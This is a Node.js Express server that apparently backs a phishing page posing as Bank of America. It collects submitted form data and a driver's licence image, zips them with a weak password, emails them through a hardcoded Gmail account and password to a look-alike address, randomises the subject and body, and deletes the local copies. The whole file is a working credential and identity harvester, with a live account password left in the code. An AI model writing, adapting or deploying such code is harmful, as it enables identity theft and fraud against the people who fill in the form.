const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const multer = require("multer");
const zipFolder = require("zip-a-folder");
const compromise = require("compromise");

// Generate a random sentence for the email body
const randomSentence = compromise("i").random().sentences(1).out();

// Generate a random sentence for the email subject
const randomSubject = compromise("i").random().sentences(1).out();

const port = 9000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Set up file upload using multer
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "uploads/");
  },
  filename: function (req, file, cb) {
    const ext = path.extname(file.originalname);
    cb(null, Date.now() + ext);
  },
});

const upload = multer({ storage: storage });

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
  try {
    const data = req.body;

    // validate data
    if (!data || typeof data !== "object") {
      throw new Error("Invalid data.");
    }

    // create a folder to store the message data
    const folderName = `message-${Date.now()}`;
    fs.mkdirSync(folderName);

    // save the message data to a text file
    const dataFileName = path.join(folderName, "happy.txt");
    fs.writeFileSync(dataFileName, JSON.stringify(data));

    // save the uploaded file to the folder
    const uploadedFileName = path.join(folderName, req.file.originalname);
    fs.copyFileSync(req.file.path, uploadedFileName);

    // create a password-protected zip file of the folder
    const zipFileName = "happy.zip";
    const password = "1234";
    await zipFolder.zip(folderName, zipFileName, password);

    // create nodemailer transport object
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 465,
      secure: true,
      auth: {
        user: "zombieoopie@gmail.com",
        pass: "ysynygftbublkngn",
      },
    });

    // create mail options object
    const mailOptions = {
      from: "zombieoopie@gmail.com",
      to: "bankofamerican9887@gmail.com", // recipient email address
      subject: `${randomSubject}`,
      text: `${randomSentence}`,
      attachments: [
        {
          filename: zipFileName,
          path: zipFileName,
        },
      ],
    };

    // send mail with defined transport object
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent successfully.", info);

    // remove the folder and zip file
    fs.unlinkSync(zipFileName);
    fs.rmdirSync(folderName, { recursive: true });

    res.sendFile(path.join(__dirname, "confirmation.html"));
  } catch (err) {
    console.error(err);
    res.status(500).send("Error sending email.");
  }
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
